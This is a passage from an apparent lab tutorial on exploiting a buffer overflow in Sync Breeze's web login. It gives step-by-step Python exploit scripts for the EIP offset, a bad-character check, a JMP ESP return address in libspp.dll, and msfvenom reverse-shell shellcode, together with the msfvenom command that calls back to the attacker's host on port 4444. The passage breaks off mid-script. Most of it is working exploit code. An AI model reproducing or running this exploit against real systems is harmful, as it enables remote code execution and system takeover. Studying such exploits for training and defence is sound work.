</span></span><span style="display:flex;"><span>    burp0_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: usernameEntry, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;testlogin&#34;</span>}
</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(burp0_url, headers<span style="color:#f92672">=</span>burp0_headers, data<span style="color:#f92672">=</span>burp0_data)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;crashed&#34;</span>)
</span></span></code></pre></div></li>
<li>
<p>As expected the code crashed the application. And we see EIP&rsquo;s value <code>42306142</code>.
<img src="/images/eip800crash.png" alt=" EIP Crash" /></p>
</li>
<li>
<p>Now let&rsquo;s find the occurence of the <code>42306142</code> on the 800 character string we previously created. The tool we&rsquo;re going to use is also from metasploit. <strong>The result is 780</strong>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <span style="color:#ae81ff">800</span> -q <span style="color:#ae81ff">42306142</span>
</span></span></code></pre></div><img src="/images/offsetCount.png" alt="Pattern" width="700"/>
</li>
</ol>
<p><a href="#overview">Back to top</a></p>
<br/>
<h2 id="controlling-eip">Controlling EIP</h2>
<p>Controlling the value of the Extended Instruction Pointer (EIP) register is important in buffer overflow attacks because it determines the flow of execution in the vulnerable application.</p>
<p>The EIP register holds the memory address of the next instruction that the application will execute. In a buffer overflow attack, the attacker seeks to control the value of the EIP register so that it points to malicious code, rather than the intended code.</p>
<p>Now that we know the offset value. Let&rsquo;s make sure we can write to the EIP exactly what we wanted. Modify code to match this.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">780</span>
</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;BBBB&#39;</span>
</span></span><span style="display:flex;"><span>filler <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;D&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#75715e">#total should be same as 800 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>usernameEntry <span style="color:#f92672">=</span> buffer <span style="color:#f92672">+</span> eip <span style="color:#f92672">+</span> filler
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    burp0_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.96:80/login&#34;</span>
</span></span><span style="display:flex;"><span>    burp0_headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span>, <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;en-US,en;q=0.5&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;close&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96/login&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    burp0_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: usernameEntry, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;testlogin&#34;</span>}
</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(burp0_url, headers<span style="color:#f92672">=</span>burp0_headers, data<span style="color:#f92672">=</span>burp0_data)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;crashed&#34;</span>)
</span></span></code></pre></div><img src="/images/crashedEIPValue.png" alt="drawing" width="600"/>
<p>We&rsquo;ve been able to write <code>42424242</code> which is equivalent to<code>BBBB</code> to EIP. We now have control over it and we can now exploit it later.</p>
<p><a href="#overview">Back to top</a></p>
<br>
<h1 id="check-for-bad-characters">Check for Bad Characters</h1>
<p>Verifying the presence of problematic characters is essential for a successful buffer overflow attack. To ensure seamless generation of our payload, it is crucial to identify which characters will work within the target application, avoiding any potential hindrances in the process.</p>
<p>To do that let&rsquo;s rewrite the code to match the code below. <strong>badchar</strong> is a variable that lists all possible characters.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>badchar <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">780</span>
</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;BBBB&#39;</span>
</span></span><span style="display:flex;"><span>filler <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;D&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#75715e">#total should be same as 800 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>usernameEntry <span style="color:#f92672">=</span> buffer <span style="color:#f92672">+</span> eip <span style="color:#f92672">+</span> filler <span style="color:#f92672">+</span> badchar
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    burp0_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.96:80/login&#34;</span>
</span></span><span style="display:flex;"><span>    burp0_headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span>, <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;en-US,en;q=0.5&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;close&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96/login&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    burp0_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: usernameEntry, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;testlogin&#34;</span>}
</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(burp0_url, headers<span style="color:#f92672">=</span>burp0_headers, data<span style="color:#f92672">=</span>burp0_data)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;crashed&#34;</span>)
</span></span></code></pre></div><p>Make sure <a href="#attach-sync-breeze-service-to-immunuty-debugger">Sync Breeze is running</a> then execute this code. We are expecting a crash similar to the access violation we had earlier.</p>
<p>At immunity debuuger, right click on <strong>ESP</strong> &gt; <strong>Follow in Dump</strong>. Then on dump section visually inspect the result and check for any missing characters.</p>
<img src="/images/badchar1.png" alt="Badchar"/>
<p>Below are an example of bad characters (picture is not from this example). <br/> <img src="/images/badcharSample.png" alt="drawing" width="400"/></p>
<p>Take note of any bad characters found.</p>
<p><a href="#overview">Back to top</a></p>
<br>
<h1 id="finding-jmp-esp">Finding JMP ESP</h1>
<p>Finding the address of the &ldquo;JMP ESP&rdquo; instruction is important in buffer overflow attacks because it allows the attacker to redirect the flow of execution to their own malicious code.</p>
<p>The JMP ESP instruction is a machine code instruction that causes the program to jump to the address specified in the ESP (Extended Stack Pointer) register. In a buffer overflow attack, the attacker seeks to place their malicious code at the address specified by the JMP ESP instruction and control the value of the ESP register so that it points to this address.</p>
<p>When the vulnerable application reaches the JMP ESP instruction, it will jump to the attacker&rsquo;s malicious code, executing it with the same level of privileges as the vulnerable application. This allows the attacker to execute arbitrary code and carry out malicious actions.</p>
<ol>
<li>Download <a href="https://github.com/corelan/mona">mona.py</a> and save it at <code>C:\Program Files (x86)\Immunity Inc\Immunity Debugger\PyCommands</code>
<img src="/images/saveMona.png" alt="drawing" width="500"/></li>
<li>Using mona modules at Immunity debugger look for anything on memmory for any file, dll or executatble with instructions <code>JMP ESP</code> by finding its OPcode equivalent <code>FFE4</code>. <br> <img src="/images/ffe4.png" alt="drawing" width="700"/></li>
<li>Use command <code>!mona modules</code> to see al modules running. Look foe anything that has no memory protection. This can be verified by checking if they <code>False</code> on all columns i.e. <code>Rebase</code>, <code>SafeSEH</code>, <code>ASLR</code>, <code>NCCompat</code> and <code>OS DLL</code>.
<img src="/images/monaModules.png" alt="drawing"/>
We found <code>libspp.dll</code>, then we now need to look for the <code>JMP ESP</code> command with in the target dll by using this command on Immunity Debugger <code>!mona find -s &quot;\xff\xe4&quot; -m libspp.dll</code>. Take note of the results we&rsquo;ll try each one of them if its multiple.
<img src="/images/ffe4Found.png" alt="FFE4 Found" width="700"/></li>
<li>To verify this, on immunity debugger jump to the memory location <code>0x10090C83</code> and verify that its value is <code>JMP ESP</code>.
<img src="/images/verifyESP.png" alt="Verify ESP" width="700"/></li>
<li>Let&rsquo;s now update our script so it will write <code>0x10090C83</code> to EIP.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">780</span>
</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x83\x0c\x09\x10</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e"># write values in reverse 10090C83</span>
</span></span><span style="display:flex;"><span>filler <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;D&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#75715e">#total should be same as 800 </span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>usernameEntry <span style="color:#f92672">=</span> buffer <span style="color:#f92672">+</span> eip <span style="color:#f92672">+</span> filler 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    burp0_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.96:80/login&#34;</span>
</span></span><span style="display:flex;"><span>    burp0_headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span>, <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;en-US,en;q=0.5&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Origin&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Connection&#34;</span>: <span style="color:#e6db74">&#34;close&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Referer&#34;</span>: <span style="color:#e6db74">&#34;http://192.168.1.96/login&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Upgrade-Insecure-Requests&#34;</span>: <span style="color:#e6db74">&#34;1&#34;</span>
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    burp0_data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;username&#34;</span>: usernameEntry, <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#e6db74">&#34;testlogin&#34;</span>}
</span></span><span style="display:flex;"><span>    requests<span style="color:#f92672">.</span>post(burp0_url, headers<span style="color:#f92672">=</span>burp0_headers, data<span style="color:#f92672">=</span>burp0_data)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;crashed&#34;</span>)
</span></span></code></pre></div><p><a href="#overview">Back to top</a></p>
<br>
<h1 id="writing-shellcode">Writing Shellcode</h1>
<p>A shellcode is a small piece of code, typically written in machine language, that is used to perform specific actions on a target system. In the context of buffer overflow attacks, a shellcode is used to gain control over the vulnerable system and execute malicious actions.</p>
<p>A shellcode is customized for each use in buffer overflow attacks because each target system is unique and has different operating systems, system configurations, and protections. The shellcode must be tailored to the specific target system to bypass any security measures and achieve successful code execution.</p>
<p>Let&rsquo;s use <code>msfvenom</code> to write a <em><strong>shellcode</strong></em> that we can use to connect on our netcat listener from our kali machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.122 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> EXITFUNC<span style="color:#f92672">=</span>thread -f c x86 -b <span style="color:#e6db74">&#34;\x00&#34;</span>    
</span></span></code></pre></div><img src="/images/payloadGeneration.png" alt="drawing" width="700"/>
<p>Copy the result and put it in our code as value of shellcode variable. Notice <code>nops</code> variable above with value <code>\x90</code>. Its acting like a spacer to ensure that the code will be executed.</p>
<p>In a buffer overflow attack, NOPs are used to create a &ldquo;NOP sled&rdquo; which is a sequence of NOP instructions placed before the shellcode. When a buffer overflow occurs, the execution flow is redirected to the NOP sled, which then guides the execution flow towards the shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">780</span>
</span></span><span style="display:flex;"><span>eip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x83\x0c\x09\x10</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># write values in reverse 10090c83</span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>nops <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xda\xd9\xba\x6d\x4d\x8e\xb7\xd9\x74\x24\xf4\x5d\x33\xc9\xb1</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x52\x31\x55\x17\x83\xc5\x04\x03\x38\x5e\x6c\x42\x3e\x88\xf2</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xad\xbe\x49\x93\x24\x5b\x78\x93\x53\x28\x2b\x23\x17\x7c\xc0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc8\x75\x94\x53\xbc\x51\x9b\xd4\x0b\x84\x92\xe5\x20\xf4\xb5</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x3b\x29\x15\x57\xf4\x3c\x54\x90\xe9\xcd\x04\x49\x65\x63</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb8\xfe\x33\xb8\x33\x4c\xd5\xb8\xa0\x05\xd4\xe9\x77\x1d\x8f</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x29\x76\xf2\xbb\x63\x60\x17\x81\x3a\x1b\xe3\x7d\xbd\xcd\x3d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7d\x12\x30\xf2\x8c\x6a\x75\x35\x6f\x19\x8f\x45\x12\x1a\x54</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x37\xc8\xaf\x4e\x9f\x9b\x08\xaa\x21\x4f\xce\x39\x2d\x24\x84</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x32\xbb\x49\x1e\x4e\x30\x6c\xf0\xc6\x02\x4b\xd4\x83\xd1</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf2\x4d\x6e\xb7\x0b\x8d\xd1\x68\xae\xc6\xfc\x7d\xc3\x85\x68</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb1\xee\x35\x69\xdd\x79\x46\x5b\x42\xd2\xc0\xd7\x0b\xfc\x17</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17\x26\xb8\x87\xe6\xc9\xb9\x8e\x2c\x9d\xe9\xb8\x85\x9e\x61</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\x29\x4b\x25\x68\x85\x24\x86\xd8\x65\x95\x6e\x32\x6a\xca</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8f\x3d\xa0\x63\x25\xc4\x23\x4c\x12\xc7\xc9\x24\x61\xc7\x3c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe9\xec\x21\x54\x01\xb9\xfa\xc1\xb8\xe0\x70\x73\x44\x3f\xfd</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb3\xce\xcc\x02\x7d\x27\xb8\x10\xea\xc7\xf7\x4a\xbd\xd8\x2d</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe2\x21\x4a\xaa\xf2\x2c\x77\x65\xa5\x79\x49\x7c\x23\x94\xf0</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd6\x51\x65\x64\x10\xd1\xb2\x55\x9f\xd8\x37\xe1\xbb\xca\x81</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xea\x87\xbe\x5d\xbd\x51\x68\x18\x17\x10\xc2\xf2\xc4\xfa\x82</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x83\x26\x3d\xd4\x8b\x62\xcb\x38\x3d\xdb\x8a\x47\xf2\x8b\x1a</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x30\xee\x2b\xe4\xeb\xaa\x4c\x07\x39\xc7\xe4\x9e\xa8\x6a\x69</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x21\x07\xa8\x94\xa2\xad\x51\x63\xba\xc4\x54\x2f\x7c\x35\x25</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x20\xe9\x39\x9a\x41\x38</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>usernameEntry <span style="color:#f92672">=</span> buffer <span style="color:#f92672">+</span> eip <span style="color:#f92672">+</span> offset <span style="color:#f92672">+</span> nops <span style="color:#f92672">+</span> shellcode 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>    burp0_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.96:80/login&#34;</span>
</span></span><span style="display:flex;"><span>    burp0_headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept&#34;</span>: <span style="color:#e6db74">&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span>, <span style="color:#e6db74">&#34;Accept-Language&#34;</span>: <span style="color:#e6db74">&#34;en-US,en;q=0.5&#34;</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Accept-Encoding&#34;</span>: <span style="color:#e6db74">&#34;gzip, deflate&#34;</span>, 
